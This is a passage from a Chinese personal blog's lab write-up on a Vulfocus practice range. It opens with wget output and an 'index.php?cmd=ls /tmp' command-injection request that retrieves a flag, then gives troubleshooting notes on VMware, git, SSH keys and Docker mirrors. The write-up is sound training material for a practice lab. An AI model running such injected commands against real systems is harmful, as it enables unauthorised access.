class="number">192.172</span><span class="number">.85</span><span class="number">.2</span>:<span class="number">80.</span>.. connected.</span><br><span class="line"># HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line"># Length: unspecified [text/html]</span><br><span class="line"># Saving to: <span class="string">'/tmp/result'</span></span><br><span class="line"># </span><br><span class="line">#      <span class="number">0</span>K                                                        <span class="number">3.55</span>M=<span class="number">0</span>s</span><br><span class="line"># </span><br><span class="line"># <span class="number">2024</span><span class="number">-06</span><span class="number">-12</span> <span class="number">13</span>:<span class="number">03</span>:<span class="number">55</span> (<span class="number">3.55</span> MB/s) - <span class="string">'/tmp/result'</span> saved [<span class="number">68</span>]</span><br><span class="line"># </span><br><span class="line"># index.php?cmd=ls /tmpflag-{bmhd132cbf4-d19f<span class="number">-4</span>dc9<span class="number">-9</span>a43<span class="number">-95</span>a500678c84}</span><br></pre></td></tr></tbody></table></figure>

<h1 id="问题汇总"><a href="#问题汇总" class="headerlink" title="问题汇总"></a>问题汇总</h1><h2 id="kali无法联网"><a href="#kali无法联网" class="headerlink" title="kali无法联网"></a>kali无法联网</h2><ol>
<li>kali关机</li>
<li>VMware-&gt;编辑-&gt;虚拟网络编辑器-&gt;更改设置-&gt;还原默认设置</li>
<li>等待完成打开kali即可</li>
</ol>
<h2 id="sudo-touch创建的markdown文档vscode无法修改"><a href="#sudo-touch创建的markdown文档vscode无法修改" class="headerlink" title="sudo touch创建的markdown文档vscode无法修改"></a>sudo touch创建的markdown文档vscode无法修改</h2><p><img src="https://s2.loli.net/2022/08/03/yJ23MDaUGdg7LCk.gif" data-original="/./img/issue_1.png" alt="issue_1"></p>
<ol>
<li>直接使用touch</li>
<li>vscode直接新建</li>
</ol>
<h2 id="git-push每次都要输入账号密码"><a href="#git-push每次都要输入账号密码" class="headerlink" title="git push每次都要输入账号密码"></a>git push每次都要输入账号密码</h2><ol>
<li>进入cuc的gitlab文件夹，输入<figure class="highlight arduino"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config credential.helper store</span><br></pre></td></tr></tbody></table></figure></li>
<li>再次输入账号密码后，以后便不再输入</li>
</ol>
<h2 id="vscode的remote-ssh配置免密登录"><a href="#vscode的remote-ssh配置免密登录" class="headerlink" title="vscode的remote-ssh配置免密登录"></a>vscode的remote-ssh配置免密登录</h2><ol>
<li>本机cmd执行 ssh-keygen -t rsa 生成ssh密钥</li>
<li>进入 C:\Users\zhu.ssh，复制id_rsa.pub文件的密钥</li>
<li>linux系统进入 ~/.ssh/authorized_keys(若没有，则新建)</li>
<li>linux执行：ssh-keygen -t rsa 生成.ssh文件夹 -&gt; touch authorized_keys 新建文件(用户文件夹内，即/home/用户/.ssh)</li>
<li>将本地的密钥复制到authorized_keys文件里</li>
</ol>
<h2 id="docker-pull失败"><a href="#docker-pull失败" class="headerlink" title="docker pull失败"></a>docker pull失败</h2><ol>
<li>添加镜像</li>
</ol>
<figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo tee <span class="regexp">/etc/</span>docker/daemon.json &lt;&lt;-<span class="string">'EOF'</span></span><br><span class="line">{</span><br><span class="line">    <span class="string">"registry-mirrors"</span> : [</span><br><span class="line">    <span class="string">"https://docker.mirrors.ustc.edu.cn"</span>,</span><br><span class="line">    <span class="string">"https://yxzrazem.mirror.aliyuncs.com"</span>,</span><br><span class="line">    <span class="string">"http://hub-mirror.c.163.com"</span>]</span><br><span class="line">}</span><br><span class="line">EOF</span><br></pre></td></tr></tbody></table></figure>

<ol start="2">
<li>重启守护进程</li>
</ol>
<figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl daemon-reload</span></span><br></pre></td></tr></tbody></table></figure>

<ol start="3">
<li>重启服务</li>
</ol>
<figure class="highlight ebnf"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo systemctl restart docker</span></span><br></pre></td></tr></tbody></table></figure>
    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/11/17/linux%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/" rel="prev" title="linux常用指令">
      <i class="fa fa-chevron-left"></i> linux常用指令
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          



        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E4%B8%8B%E8%BD%BDVMware-17%E5%B9%B6%E5%AE%89%E8%A3%85kali"><span class="nav-number">1.</span> <span class="nav-text">1.下载VMware 17并安装kali</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E9%85%8D%E7%BD%AEkali"><span class="nav-number">2.</span> <span class="nav-text">2.配置kali</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E6%9C%AC%E5%9C%B0ssh%E6%9C%AC%E5%9C%B0%E8%BF%9E%E6%8E%A5%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="nav-number">3.</span> <span class="nav-text">3.本地ssh本地连接虚拟机</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-cmd%E8%BF%9E%E6%8E%A5kali"><span class="nav-number">3.1.</span> <span class="nav-text">3.1.cmd连接kali</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-vscode%E8%BF%9E%E6%8E%A5kali"><span class="nav-number">3.2.</span> <span class="nav-text">3.2.vscode连接kali</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E4%B8%8B%E8%BD%BDdocker%E5%B9%B6%E9%85%8D%E7%BD%AE"><span class="nav-number">4.</span> <span class="nav-text">4.下载docker并配置</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-%E4%B8%8B%E8%BD%BDctf-games%E5%B9%B6%E6%8B%89%E5%8F%96vulfocus%E9%95%9C%E5%83%8F"><span class="nav-number">5.</span> <span class="nav-text">5.下载ctf-games并拉取vulfocus镜像</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-%E5%AE%89%E8%A3%85jq"><span class="nav-number">6.</span> <span class="nav-text">6.安装jq</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-%E5%90%AF%E5%8A%A8%E5%B9%B6%E8%AE%BF%E9%97%AEvulfocus"><span class="nav-number">7.</span> <span class="nav-text">7.启动并访问vulfocus</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="nav-number">8.</span> <span class="nav-text">8.基本使用</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#9-%E5%9C%BA%E6%99%AF%E7%AE%A1%E7%90%86"><span class="nav-number">9.</span> <span class="nav-text">9.场景管理</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#9-1-%E6%B7%BB%E5%8A%A0%E5%9C%BA%E6%99%AF"><span class="nav-number">9.1.</span> <span class="nav-text">9.1.添加场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-2-%E5%90%AF%E5%8A%A8%E5%9C%BA%E6%99%AF"><span class="nav-number">9.2.</span> <span class="nav-text">9.2.启动场景</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10-%E5%AE%89%E8%A3%85metasploit-framework-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6"><span class="nav-number">10.</span> <span class="nav-text">10.安装metasploit-framework(渗透测试框架)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#11-%E8%8E%B7%E5%8F%96flag1"><span class="nav-number">11.</span> <span class="nav-text">11.获取flag1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#12-%E8%8E%B7%E5%8F%96flag2%EF%BC%8C3%EF%BC%8C4"><span class="nav-number">12.</span> <span class="nav-text">12.获取flag2，3，4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#13-%E8%8E%B7%E5%8F%96flag5"><span class="nav-number">13.</span> <span class="nav-text">13.获取flag5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB"><span class="nav-number">14.</span> <span class="nav-text">问题汇总</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#kali%E6%97%A0%E6%B3%95%E8%81%94%E7%BD%91"><span class="nav-number">14.1.</span> <span class="nav-text">kali无法联网</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sudo-touch%E5%88%9B%E5%BB%BA%E7%9A%84markdown%E6%96%87%E6%A1%A3vscode%E6%97%A0%E6%B3%95%E4%BF%AE%E6%94%B9"><span class="nav-number">14.2.</span> <span class="nav-text">sudo touch创建的markdown文档vscode无法修改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#git-push%E6%AF%8F%E6%AC%A1%E9%83%BD%E8%A6%81%E8%BE%93%E5%85%A5%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="nav-number">14.3.</span> <span class="nav-text">git push每次都要输入账号密码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vscode%E7%9A%84remote-ssh%E9%85%8D%E7%BD%AE%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95"><span class="nav-number">14.4.</span> <span class="nav-text">vscode的remote-ssh配置免密登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#docker-pull%E5%A4%B1%E8%B4%A5"><span class="nav-number">14.5.</span> <span class="nav-text">docker pull失败</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="MarshVer" src="https://s2.loli.net/2022/08/03/gTEIJebhf812WaZ.png">
  <p class="site-author-name" itemprop="name">MarshVer</p>
  <div class="site-description" itemprop="description">个人博客</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">13</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/marshver" title="GitHub → https://github.com/marshver" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1954440662@qq.com" title="E-Mail → mailto:1954440662@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  © 2022 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">MarshVer</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">62k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">1:43</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> &amp; <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  
  
  












  
    


  
















  
  

  

  


        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        



<script src="/bundle.js"></script><script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
;

            window.imageLazyLoadSetting = {
                isSPA: true,
                preloadRatio: 3,
                processImages: null,
            };
        ;
window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});;
!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a,i=c[o];e=function(){c=c.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,a=t.getAttribute("data-original"),n.onload=function(){t.src=a,t.removeAttribute("data-original"),e&&e()},t.src!==a&&(n.src=a))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this);</script></body></html>